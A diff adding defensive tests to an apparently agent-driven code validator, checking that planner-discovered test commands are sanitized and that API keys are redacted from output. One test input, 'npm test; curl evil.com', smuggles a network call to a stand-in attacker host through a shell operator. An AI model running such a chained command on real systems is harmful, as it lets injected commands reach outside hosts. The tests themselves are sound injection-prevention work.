@@ -265,6 +265,80 @@ describe('layer priority', () => {
   });
 });
 
+describe('discovered validation sanitization', () => {
+  let tempDir: string;
+
+  beforeEach(() => {
+    tempDir = createTempDir('val-sanitize');
+  });
+
+  afterEach(() => {
+    cleanupTempDir(tempDir);
+  });
+
+  function mkTask(file: string): Task {
+    return makeTask({ file, action: 'modify' });
+  }
+
+  const fakeBus = { publish: () => {}, subscribe: () => () => {} };
+
+  it('does NOT execute planner-discovered ./evil-script', async () => {
+    const runner = makeCommandRunner();
+    const validator = createValidator({ runCommand: runner });
+    const config = makeConfig({ typecheck: false, lint: false, test: true, testCommand: undefined });
+    const discovered: DiscoveredValidation = { testCommand: './scripts/evil' };
+
+    mkdirSync(join(tempDir, 'tests'), { recursive: true });
+    writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');
+
+    const results = await validator.runValidation(
+      mkTask('src/foo.ts'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id'], discovered,
+    );
+
+    for (const call of runner.calls) {
+      expect(call.cmd).not.toContain('evil');
+      expect(call.args.join(' ')).not.toContain('evil');
+    }
+    if (results.length > 0) {
+      expect(results.find(r => r.stage === 'test')?.output).not.toContain('evil');
+    }
+  });
+
+  it('does NOT execute planner-discovered commands with shell operators', async () => {
+    const runner = makeCommandRunner();
+    const validator = createValidator({ runCommand: runner });
+    const config = makeConfig({ typecheck: false, lint: false, test: true, testCommand: undefined });
+    const discovered: DiscoveredValidation = { testCommand: 'npm test; curl evil.com' };
+
+    mkdirSync(join(tempDir, 'tests'), { recursive: true });
+    writeFileSync(join(tempDir, 'tests', 'foo.test.ts'), '');
+
+    await validator.runValidation(
+      mkTask('src/foo.ts'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id'], discovered,
+    );
+
+    for (const call of runner.calls) {
+      expect(call.cmd).not.toContain('curl');
+      expect(call.args.join(' ')).not.toContain('curl');
+    }
+  });
+
+  it('executes safe planner-discovered commands normally', async () => {
+    const runner = makeCommandRunner();
+    const validator = createValidator({ runCommand: runner });
+    const config = makeConfig({ typecheck: false, lint: false, test: true, testCommand: undefined });
+    const discovered: DiscoveredValidation = { testCommand: 'npx vitest run' };
+
+    await validator.runValidation(
+      mkTask('src/foo.ts'), tempDir, config, fakeBus, 'implementing', 't1' as Task['id'], discovered,
+    );
+
+    expect(runner.calls.length).toBeGreaterThan(0);
+    expect(runner.calls[0]?.cmd).toBe('npx');
+    expect(runner.calls[0]?.args).toContain('vitest');
+  });
+});
+
 describe('formatValidationError edge cases', () => {
   it('falls back to output when error is undefined', () => {
     const results: ValidationResult[] = [
@@ -273,5 +347,43 @@ describe('formatValidationError edge cases', () => {
     const error = formatValidationError(results);
     expect(error).toContain('lint');
     expect(error).toContain('some lint output');
+  });
+});
+
+describe('validation output redaction', () => {
+  let tempDir: string;
+  beforeEach(() => { tempDir = createTempDir('validator-redact'); });
+  afterEach(() => { cleanupTempDir(tempDir); });
+
+  it('redacts API keys from validation error output before publishing', async () => {
+    const secret = 'sk-ant-api03-TEST123456789012345678';
+    const runner = makeCommandRunner({ stdout: `Error: ${secret}`, stderr: `FAIL: key=${secret}`, code: 1 });
+    const validator = createValidator({ runCommand: runner });
+    const config = makeConfig({ typecheck: true, lint: false, test: false });
+    const events: Array<Record<string, unknown>> = [];
+    const bus = { publish: (e: Record<string, unknown>) => events.push(e), subscribe: () => () => {} };
+
+    await validator.runValidation(
+      makeTask({ file: 'src/a.ts' }), tempDir, config, bus as never, 'implementing', 't1' as Task['id'],
+    );
+
+    const validateEvent = events.find(e => e.type === 'validate' && e.status === 'done');
+    expect(validateEvent).toBeDefined();
+    expect(String(validateEvent?.error ?? '')).not.toContain('TEST123456789012345678');
+    expect(String(validateEvent?.error ?? '')).toContain('REDACTED');
+  });
+
+  it('caps validation output to 4096 characters', async () => {
+    const longOutput = 'x'.repeat(5000);
+    const runner = makeCommandRunner({ stdout: longOutput, stderr: '', code: 0 });
+    const validator = createValidator({ runCommand: runner });
+    const config = makeConfig({ typecheck: true, lint: false, test: false });
+    const bus = { publish: () => {}, subscribe: () => () => {} };
+
+    const results = await validator.runValidation(
+      makeTask({ file: 'src/a.ts' }), tempDir, config, bus as never, 'implementing', 't1' as Task['id'],
+    );
+
+    expect(results[0]?.output?.length).toBeLessThanOrEqual(4097);
   });
 });
